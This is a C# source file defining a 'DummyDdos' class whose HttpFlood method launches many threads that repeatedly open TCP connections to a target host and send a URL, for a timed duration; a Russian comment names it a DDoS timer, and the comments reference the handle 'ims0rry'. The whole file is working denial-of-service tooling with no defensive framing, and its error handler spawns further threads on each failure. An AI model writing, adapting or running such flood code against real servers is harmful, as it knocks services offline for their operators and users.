using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace DummyDdos
{
    class Ddos
    {
        private string HostName; // 127.0.0.1
        private string Url; // http://127.0.0.1/index.php?god=ims0rry
        private int Port; // 80
        private bool Toggle = false; // Для отсчета времени ддоса

        public Ddos(string Host, string Url, int Port)
        {
            this.HostName = Host;
            this.Url = Url;
            this.Port = Port;
        }

        public void HttpFlood(int duration, int threads)
        {
            Toggle = true;
            while (threads > 0)
            {
                new Thread(SendData).Start();
                threads--;
            }
            new Thread(() => Timer(duration)).Start();
        }

        private void SendData()
        {
            IPAddress Host = IPAddress.Parse(HostName);
            IPEndPoint Hostep = new IPEndPoint(Host, Port);
            while (Toggle)
            {
                try
                {
                    Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sock.Connect(Hostep);
                    sock.Send(Encoding.UTF8.GetBytes(Url));
                    sock.Send(Encoding.UTF8.GetBytes("\r\n"));
                    sock.Close();
                }
                catch(Exception e)
                {
                    new Thread(SendData).Start();
                }
            }            
        }

        private void Timer(int minutes)
        {
            for(int i = 0; i < minutes * 60; i++)
            {
                Thread.Sleep(1000);
            }
            Toggle = false;
        }
    }
}
